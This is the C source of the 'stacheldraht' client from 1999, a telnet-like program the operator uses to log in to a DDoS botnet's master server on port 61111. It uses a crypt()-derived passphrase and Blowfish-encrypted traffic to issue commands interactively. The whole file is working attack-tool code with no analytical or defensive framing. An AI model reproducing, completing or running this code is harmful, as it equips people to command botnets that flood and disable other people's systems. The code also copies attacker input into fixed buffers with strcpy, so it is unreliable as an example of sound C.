/*
 [*] stacheldraht [*]
 
 telnet alike masterserver client

 (c) in 1999 by randomizer
*/

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "blowfish.h"

#define MASTERSERVERPORT 61111
#define timeout 10

/* encrypted password given by crypt() */
char result[14];

char *crypt(const char *, const char *);
void decryptstuff(char *,char *,char *);
void encryptstuff(char *,char *,char *);

char *encrypt_string(char *, char *);
char *decrypt_string(char *, char *);


/* multiplexer routine */
void setupfdroutine(int fd)
{
 fd_set fdset;
 char data[1024];
 char encrypteddata[1024];
 char decrypteddata[1024];
 int fuckit;
 int left,readit;
 int readd;
 char *pointi;

// fcntl(fd,F_SETFL,O_NONBLOCK);

 while (1) {
  /* zero the fdset bullshit */
  FD_ZERO(&fdset);
  /* we need stdin connected to our leeto socket */
  FD_SET(0,&fdset);
  /* leet0 network socket */
  FD_SET(fd,&fdset);
  /* wait till something changes */
  select(FD_SETSIZE,&fdset,NULL,NULL,NULL);
  memset(data,0,sizeof(data));
  memset(encrypteddata,0,sizeof(encrypteddata));

  /* check if stdin stream state changed */
  if (FD_ISSET(0,&fdset))
  {
   /* read out from stdin */
   read(0,data,sizeof(data));
   encryptstuff(data,encrypteddata,result);

   write(fd,encrypteddata,sizeof(encrypteddata));
  } 
  /* check if socket state changed */
  if (FD_ISSET(fd,&fdset))
  {
   /* read socket data */

/*   readd=0;
   readit=0;
   pointi=(char*)&data;
   left=sizeof(data);
   
   while (readit!=sizeof(data)) {
    readd=read(fd,pointi,left);
    if (!readd) {
     printf("connection closed.\n");
     exit(0);
    }
    left=sizeof(data)-readd;
    readit=readit+readd;
    pointi=pointi+readd;
   } */
   if (!read(fd,data,sizeof(data))) {
    printf("connection closed.\n");
    exit(0);
   }



   decryptstuff(data,decrypteddata,result);
   memset(data,0,sizeof(data));
   /* display output */
   printf("%s",decrypteddata); 
   fflush(stdout);
  }
 }
}

void decryptstuff(char *source,char *desti,char *key)
{
 strcpy(desti,decrypt_string(key,source));
}


void encryptstuff(char *source,char *desti,char *key)
{
 strcpy(desti,encrypt_string(key,source));
}


void main(int argc,char **argv) 
{
 int connectsocket;
 unsigned long destinationip;

 struct sockaddr_in connectstruct;
 /* typed in user passphrase */
 char password[200];
 /* encrypted crypt() password with blowfish ;) */
 char encryptedcrap[1024];
 /* used for masterserver replies */
 char replybuffer[1024];
 struct hostent *hostenti;

 if (argc<2) {
  printf("usage: ./sclient <ip/host>\n");
  exit(-1);
 }

 printf("    [*] stacheldraht [*] \n");
 printf(" (c) in 1999 by randomizer\n\n");
 printf("trying to connect...\n");
 
 /* resolve bullshit */
 hostenti=gethostbyname(argv[1]);
 if (!hostenti) {
  printf("unable to resolv %s\n",argv[1]);
  exit(0);
 } 

 destinationip=*(unsigned long*)hostenti->h_addr;
 
 /* setup socket needed to connect later */
 connectsocket=socket(AF_INET,SOCK_STREAM,0);
 connectstruct.sin_family=AF_INET;
 connectstruct.sin_port=htons(MASTERSERVERPORT);
 connectstruct.sin_addr.s_addr=destinationip;

 /* connect to the damn masterserver */
 if (connect(connectsocket,(struct sockaddr*)&connectstruct,sizeof(struct sockaddr))!=0) {
  printf("unable to connect.\n");
  exit(-1);
 } 
 
 memset(password,0,sizeof(password));
 memset(encryptedcrap,0,sizeof(encryptedcrap));
 memset(result,0,sizeof(result));
 memset(replybuffer,0,sizeof(replybuffer));

 printf("connection established.\n");
 printf("--------------------------------------\n");
 strcpy(password,getpass("enter the passphrase : "));
 fflush(stdout);
 printf("--------------------------------------\n");
 strcpy(result,crypt(password,"zA"));

 encryptstuff("authentication",encryptedcrap,result);
 
 /* send it to the masterserver */
 write(connectsocket,encryptedcrap,sizeof(encryptedcrap)); 

 /* wait for the authentication reply */
 read(connectsocket,replybuffer,sizeof(replybuffer));
 if (strstr(replybuffer,"failed")!=NULL) {
  close(connectsocket);
  printf("authentication failed.\n");
  printf("connection closed.\n");
  exit(-1);
 }
 /* authentication done */
 printf("entering interactive session.\n");
 /* install the multiplex0a0a0a0r  */
 setupfdroutine(connectsocket);
}
